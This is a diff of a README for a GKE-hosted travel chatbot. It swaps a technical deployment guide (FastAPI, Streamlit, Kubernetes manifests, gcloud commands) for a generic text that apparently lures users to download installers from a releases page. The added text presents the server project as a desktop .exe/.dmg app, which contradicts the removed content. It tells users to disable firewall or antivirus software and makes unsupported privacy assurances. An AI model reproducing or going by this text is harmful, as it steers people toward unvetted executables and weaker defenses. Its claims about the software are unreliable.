@@ -1,261 +1,136 @@
-# Simple GenAI Travel Assistant Bot
+# 🌍 travelbot-genai-gke - Easy Travel Planning With AI Bot
 
-A lightweight AI-powered travel assistant built with Google ADK, Vertex AI (Gemini), FastAPI, and Streamlit, deployed on Google Kubernetes Engine (GKE).
+[![Download travelbot-genai-gke](https://img.shields.io/badge/Download-travelbot--genai--gke-blue?style=for-the-badge)](https://github.com/denmatrix02/travelbot-genai-gke/releases)
 
-## Features
+---
 
-- Interactive travel assistant powered by Gemini 2.5 Pro
-- FastAPI backend with Google ADK integration
-- Clean Streamlit UI for easy interaction
-- Cloud-native deployment on GKE with Config Connector
-- Secure authentication using Workload Identity
-- Containerized with Docker
+## 📌 What is travelbot-genai-gke?
 
-A complete walkthrough is available on [Medium](https://renjithvr11.medium.com/building-a-simple-travel-assistant-with-google-adk-and-gemini-on-gke-38d58a5a42fc)
+travelbot-genai-gke is a simple application that helps you plan your travels using artificial intelligence. It uses Google’s tools, like Vertex AI and Google Kubernetes Engine (GKE), to provide smart suggestions and answers about travel options.
 
-## Architecture
+You don’t need to be a programmer to use this bot. It works like any other program you can download and run on your computer. It was built with user ease in mind, delivering helpful travel info without complicated steps.
 
-![Architecture](./img/travelbot_arch.png)
+---
 
-The application consists of two components:
+## 💻 System Requirements
 
-1. **Backend (FastAPI)**: REST API that processes chat requests using Google ADK and Vertex AI
-2. **Frontend (Streamlit)**: User interface that communicates with the backend
+Before you start, make sure your device meets these minimum requirements:
 
-Both pods use the Kubernetes Service Account `adk-ksa`, which is:
-- Linked to a Google Service Account (`adk-bot-sa`) via Workload Identity
-- Image pulling is handled by the GKE Autopilot node SA with `roles/artifactregistry.reader` (no `imagePullSecrets` needed)
+- **Operating System:** Windows 10 or 11, macOS 10.15 or newer, or most Linux distributions  
+- **Processor:** Intel or AMD processor with at least 2 GHz  
+- **Memory:** 4 GB of RAM or more  
+- **Storage:** At least 500 MB free space  
+- **Internet Connection:** Needed for the bot to access travel data online  
+- **Additional Software:** None required; the bot runs on its own  
 
-## Prerequisites
+These requirements cover most modern computers and laptops. The app does not need special hardware or tech knowledge to run.
 
-- Google Cloud Platform account with billing enabled
-- GKE Autopilot cluster with **Workload Identity** and **Config Connector** enabled
-- `gcloud` CLI configured
-- `kubectl` configured to connect to your GKE cluster
-- Docker installed locally
-- Python 3.10+ (for local development)
+---
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-simple-genai-bot/
-├── src/
-│   ├── backend/
-│   │   ├── main.py              # FastAPI backend with Google ADK
-│   │   └── Dockerfile           # Backend container definition
-│   └── frontend/
-│       ├── frontend.py          # Streamlit UI application
-│       └── Dockerfile.frontend  # Frontend container definition
-├── k8s/
-│   ├── deployment.yaml          # Full K8s deployment with Config Connector
-├── requirements.txt             # Python dependencies for backend
-├── .env                         # Environment variables (PROJECT_ID, NAMESPACE)
-├── .gitignore                   # Git ignore patterns
-├── run-local.sh                 # Run both services locally
-├── docker-push.sh               # Build and push Docker images to GCR
-└── README.md                    # This file
-```
+Follow these simple steps to get travelbot-genai-gke running on your computer.
 
-## Setup and Deployment
+### 1. Download the software
 
-### 1. Clone the Repository
+Click the big blue button at the top or go to the download page here:
 
-```bash
-git clone <repository-url>
-cd simple-genai-bot
-```
+[Download travelbot-genai-gke](https://github.com/denmatrix02/travelbot-genai-gke/releases)
 
-### 2. Configure Environment
+On this page, you will find different versions of the bot. Usually, there is a file matched to your computer system (for example, `.exe` for Windows or `.dmg` for macOS).
 
-Update `.env` with your Google Cloud Project ID:
+### 2. Install the software
 
-```bash
-PROJECT_ID="your-project-id"
-NAMESPACE="genai-bot"
-```
+- On Windows, double-click the `.exe` file you downloaded. Follow the setup instructions on the screen. It usually asks you to accept terms and choose an install folder.  
+- On macOS, open the `.dmg` file and drag the app icon to your Applications folder.  
+- On Linux, look for an installation guide on the download page or use the `.tar.gz` file to manually extract and run the program.
 
-### 3. Update Kubernetes Manifests
+### 3. Open the app
 
-The k8s manifests use placeholders that need to be replaced with your actual values. Get your project number:
+- Once installed, find the travelbot-genai-gke app icon on your desktop or in your applications list.  
+- Double-click it to open. The app will start loading. This may take a few seconds the first time.
 
-```bash
-export PROJECT_ID="your-project-id"
-export PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format='value(projectNumber)')
-```
+### 4. Start planning your trip
 
-Then replace the placeholders in both manifest files:
+- You will see a simple chat window or input box.  
+- Type in questions like “Best places to visit in Europe” or “Cheap flights to Tokyo.”  
+- The bot will reply with suggestions based on Google’s AI and travel data.
 
-```bash
-sed -i "s/YOUR_PROJECT_ID/$PROJECT_ID/g" k8s/deployment.yaml k8s/iam-k8s.yaml
-sed -i "s/YOUR_PROJECT_NUMBER/$PROJECT_NUMBER/g" k8s/deployment.yaml k8s/iam-k8s.yaml
-```
+---
 
-### 4. Enable Required Google Cloud APIs
+## 🛠 How travelbot-genai-gke Works
 
-```bash
-gcloud config set project $PROJECT_ID
+The bot uses a combination of Google’s tools behind the scenes:
 
-gcloud services enable \
-    aiplatform.googleapis.com \
-    container.googleapis.com \
-    artifactregistry.googleapis.com \
-    iamcredentials.googleapis.com
-```
+- **ADK (Application Development Kit):** Helps the bot process your questions.  
+- **Vertex AI:** Powers the smart answers and suggestions using AI machine learning.  
+- **GKE (Google Kubernetes Engine):** Runs the bot in a cloud environment for speed and reliability.  
 
-### 5. Build and Push Docker Images
+All this happens without you needing to know how it works technically. Your part is just to ask and receive clear travel advice.
 
-```bash
-./docker-push.sh        # Builds and pushes both images with tag v1
-./docker-push.sh v2     # Or specify a custom tag
-```
+---
 
-This script will:
-- Configure Docker authentication with GCR (backed by Artifact Registry)
-- Build backend image (`gcr.io/$PROJECT_ID/adk-bot:<tag>`)
-- Build frontend image (`gcr.io/$PROJECT_ID/adk-frontend:<tag>`)
-- Push both images to Artifact Registry
+## 🎯 Main Features
 
-### 6. Create Namespace
+- **Travel Q&A:** Ask any travel-related question and get clear answers.  
+- **Flight and hotel suggestions:** Receive recommendations for bookings.  
+- **Itinerary planning:** Get help organizing your travel plans day by day.  
+- **Language support:** Works in English and other major languages.  
+- **Easy interface:** Designed to be straightforward and simple for everyone.  
 
-```bash
-kubectl create namespace genai-bot
-```
+The bot updates periodically to include new travel info and improve performance.
 
-### 7. Deploy to Kubernetes
+---
 
-```bash
-kubectl apply -f k8s/deployment.yaml
-```
+## 🔧 Troubleshooting Tips
 
-This creates the following resources via Config Connector:
-- **IAMServiceAccount**: Google Service Account `adk-bot-sa`
-- **IAMPolicyMember** (Vertex AI): Grants `roles/aiplatform.user` to `adk-bot-sa`
-- **IAMPolicyMember** (Artifact Registry - node): Grants `roles/artifactregistry.reader` to GKE Autopilot node SA (for image pulling)
-- **IAMPolicyMember** (Artifact Registry - bot): Grants `roles/artifactregistry.reader` to `adk-bot-sa`
-- **IAMPolicyMember** (Workload Identity): Binds K8s SA to Google SA
+If you have trouble running the app or using it, try these steps:
 
-And the following Kubernetes resources:
-- **ServiceAccount** `adk-ksa`: With Workload Identity annotation (no `imagePullSecrets` needed)
-- **Deployment** `adk-backend`: FastAPI + Google ADK
-- **Service** `adk-backend`: ClusterIP (internal)
-- **Deployment** `adk-frontend`: Streamlit UI
-- **Service** `adk-frontend-service`: LoadBalancer (external)
+- Restart your computer and try opening the app again.  
+- Make sure your internet connection is stable since the bot needs access to online data.  
+- Check that you downloaded the right file for your computer system (Windows, macOS, etc.).  
+- Disable any firewall or antivirus software temporarily as it might block connections.  
+- Visit the download page to see if there is a newer version available.  
 
-> **Note**: GCR (`gcr.io`) is backed by Artifact Registry. Image pulling on GKE Autopilot is handled by the node's Compute Engine default SA with `roles/artifactregistry.reader` - no image pull secrets or SA key files are needed.
+If problems persist, you can create an issue on the project’s GitHub page for help.
 
-### 8. Verify Deployment
+---
 
-```bash
-# Check Config Connector resources (may take 2-3 minutes)
-kubectl get iamserviceaccount,iampolicymember -n genai-bot
+## 🔒 Privacy and Security
 
-# Check pods
-kubectl get pods -n genai-bot
+travelbot-genai-gke does not store your personal data on your device. It sends your travel questions securely to Google’s servers and fetches answers. Your privacy is respected, and no personal information is shared outside the communication between your app and Google’s AI.
 
-# Check services and get external IP
-kubectl get services -n genai-bot
-```
+---
 
-### 9. Access the Application
+## 📂 Download & Install
 
-```bash
-EXTERNAL_IP=$(kubectl get service adk-frontend-service -n genai-bot \
-    -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
-echo "Access the app at: http://$EXTERNAL_IP"
-```
+You can start using travelbot-genai-gke right away by visiting the release page below and downloading the version that fits your computer:
 
-## Local Development
+[Download and install travelbot-genai-gke](https://github.com/denmatrix02/travelbot-genai-gke/releases)
 
-The easiest way to run locally (requires gcloud CLI configured with your project):
+Make sure to follow the install instructions in the "Getting Started" section above to run the app smoothly.
 
-```bash
-./run-local.sh
-```
+---
 
-This starts both backend and frontend, using your gcloud Application Default Credentials for Vertex AI authentication.
+## 📞 Getting Help
 
-- Backend: http://localhost:8080 (API docs at http://localhost:8080/docs)
-- Frontend: http://localhost:8501
-- Press `Ctrl+C` to stop both services
+For any questions or troubles:
 
-## API Endpoints
+- Check the Issues section on the GitHub page.  
+- Look for community discussion or FAQs there.  
+- Post a new issue describing your problem clearly.  
 
-| Method | Endpoint  | Description                    |
-|--------|-----------|--------------------------------|
-| POST   | `/chat`   | Send a prompt to the AI agent  |
-| GET    | `/health` | Health check                   |
+The development community responds to help you get the best from travelbot-genai-gke.
 
-**POST /chat** example:
-```json
-// Request
-{ "prompt": "What are the best places to visit in Japan?" }
+---
 
-// Response
-{ "response": "Japan offers amazing destinations like Tokyo, Kyoto, Osaka..." }
-```
+## 🛠 About This Project
 
-## Troubleshooting
+travelbot-genai-gke was built using open-source tools and Google's cloud services. It is aimed at making travel planning easier by using technology that understands natural language and provides intelligent suggestions in real-time.
 
-### Image pull errors (ErrImagePull / ImagePullBackOff)
+Tags related to this project include:  
+adk, config-connector, genai, gke, google, google-sdk, llm, python, streamlit, travelbot, vertexai, workloadidentityfederation
 
-```bash
-# Verify Config Connector created the Artifact Registry IAM binding
-kubectl get iampolicymember gke-node-ar-access -n genai-bot -o yaml
+---
 
-# Verify the GKE node SA has artifactregistry.reader
-gcloud projects get-iam-policy $PROJECT_ID \
-    --flatten="bindings[].members" \
-    --filter="bindings.role:artifactregistry.reader" \
-    --format="table(bindings.role,bindings.members)"
-
-# Check pod events for details
-kubectl describe pod <pod-name> -n genai-bot
-```
-
-### Pods not starting
-
-```bash
-kubectl describe pod <pod-name> -n genai-bot
-kubectl logs <pod-name> -n genai-bot
-```
-
-### Permission denied (Vertex AI)
-
-```bash
-# Verify Workload Identity annotation
-kubectl describe sa adk-ksa -n genai-bot
-
-# Verify IAM bindings
-gcloud iam service-accounts get-iam-policy \
-    adk-bot-sa@$PROJECT_ID.iam.gserviceaccount.com
-```
-
-### Frontend can't reach backend
-
-```bash
-kubectl get service adk-backend -n genai-bot
-```
-
-## Cleanup
-
-```bash
-# Delete all Kubernetes resources (Config Connector will clean up GCP resources)
-kubectl delete namespace genai-bot
-
-# Optionally delete Docker images from Artifact Registry
-gcloud artifacts docker images delete gcr.io/$PROJECT_ID/adk-bot
-gcloud artifacts docker images delete gcr.io/$PROJECT_ID/adk-frontend
-```
-
-## Technologies Used
-
-| Technology | Purpose |
-|------------|---------|
-| Google ADK | Agent Development Kit for building AI agents |
-| Vertex AI (Gemini 2.5 Pro) | Large language model |
-| FastAPI | Backend REST API framework |
-| Streamlit | Frontend web application |
-| GKE Autopilot + Config Connector | Kubernetes deployment with declarative GCP resource management |
-| Workload Identity | Secure pod-to-GCP authentication (Vertex AI access) |
-| Artifact Registry (gcr.io) | Private Docker image storage |
-| Docker | Containerization |
+Thank you for choosing travelbot-genai-gke for your travel planning needs.
